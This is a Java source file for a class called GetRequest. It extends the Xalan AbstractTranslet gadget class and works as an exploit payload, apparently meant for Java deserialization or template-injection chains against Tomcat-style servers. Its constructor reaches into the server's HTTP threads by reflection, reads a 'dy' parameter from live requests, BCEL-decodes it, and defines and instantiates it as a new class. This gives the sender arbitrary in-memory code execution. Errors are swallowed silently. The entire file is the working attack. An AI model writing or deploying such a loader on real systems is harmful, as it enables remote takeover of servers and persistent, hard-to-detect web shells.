package source;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
public class GetRequest extends AbstractTranslet {
    public GetRequest() {
        try {
            String dy = null;
            boolean done = false;
            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));

            for (int i = 0; i < ts.length; ++i) {
                Thread t = ts[i];
                if (t != null) {
                    String s = t.getName();
                    if (!s.contains("exec") && s.contains("http")) {
                        Object o = getFV(t, "target");
                        if (o instanceof Runnable) {
                            try {
                                o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                            } catch (Exception var16) {
                                continue;
                            }

                            List ps = (List) getFV(o, "processors");

                            for (int j = 0; j < ps.size(); ++j) {
                                Object p = ps.get(j);
                                o = getFV(p, "req");
                                Object resp = o.getClass().getMethod("getResponse").invoke(o);
                                Object conreq = o.getClass().getMethod("getNote", Integer.TYPE).invoke(o, new Integer(1));
                                dy = (String) conreq.getClass().getMethod("getParameter", String.class).invoke(conreq, new String("dy"));
                                if (dy != null && !dy.isEmpty()) {
                                    byte[] bytecodes = Utility.decode(dy,false);
                                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                    defineClassMethod.setAccessible(true);
                                    Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), bytecodes, new Integer(0), new Integer(bytecodes.length));
                                    cc.newInstance();
                                    done = true;
                                }

                                if (done) {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception var17) {
        }
    }
    private Object getFV(Object o, String s) throws Exception {
        Field f = null;
        Class clazz = o.getClass();

        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }

        if (f == null) {
            throw new NoSuchFieldException(s);
        } else {
            f.setAccessible(true);
            return f.get(o);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
